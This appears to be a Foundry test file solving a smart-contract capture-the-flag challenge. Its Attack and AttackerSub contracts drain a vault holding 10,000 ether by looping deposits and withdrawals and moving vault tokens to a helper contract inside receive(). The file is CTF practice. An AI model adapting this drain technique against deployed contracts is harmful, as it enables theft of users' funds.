// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 10000 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Attack(address (setup.vault())).attack{value:1 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
contract Attack{
    Vault c_vault;
    AttackerSub sub;

    constructor(address vaultaddress){
        c_vault=Vault(vaultaddress);
        sub=new AttackerSub(vaultaddress);
    }

    function attack() public payable{
        while (true){
            if (address(this).balance>address(c_vault).balance) break;
            c_vault.deposit{value:address(this).balance}();
            c_vault.withdrawAll();
            sub.subattack();
        }
        c_vault.deposit{value:address(c_vault).balance}();
        c_vault.withdrawAll();
        sub.subattack();
        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);

    }

    receive() external payable{

       c_vault.vaultToken().transfer(address(sub), c_vault.vaultToken().balanceOf(address(this)));
    }
}

contract AttackerSub{
    Vault c_vault;
    constructor(address vaultaddress) {
        c_vault=Vault(vaultaddress);

    }
    function subattack() public{
        c_vault.withdrawAll();
        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);

    }
    receive() external payable{}
}

////////// YOUR CODE END //////////
